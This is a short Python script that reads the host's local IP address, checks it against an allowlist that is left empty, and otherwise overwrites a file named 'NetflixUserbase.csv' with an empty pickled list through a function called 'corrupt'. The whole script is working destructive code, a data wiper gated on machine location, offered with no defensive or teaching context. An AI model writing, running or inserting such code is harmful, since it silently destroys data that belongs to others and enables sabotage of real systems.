import socket
import pathlib
import pickle

def getIpAddr():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            return sock.getsockname()[0]
    except socket.error:
        return None

def checkMatch(ipaddr,iplist):
    ipele= ipaddr.split(".")
    ipref = iplist.split(".")
    check = True
    for i in range(0,4):
        if(ipref[i]!="0"):
            if(ipele[i]!=ipref[i]):
                check=False
                break
    if(check):
        return True
    return False

def checkList(ipaddr,iplist):
    check=False
    for ip in iplist:
        if(checkMatch(ipaddr,ip)):
            return True
    if(check==False):
        return False
    
def corrupt(file):
    file = open(file,"wb")
    pickle.dump([],file)
    file.close()

if __name__=="__main__":
    ip_address = getIpAddr()
    print(f"IP address is {ip_address}")
    ip_list=[]
    if(checkList(ip_address,ip_list)):
        exit(0)
    else:
        path = str(pathlib.Path("NetflixUserbase.csv").absolute())
        path = path.replace("\\","\\\\")
        corrupt(path)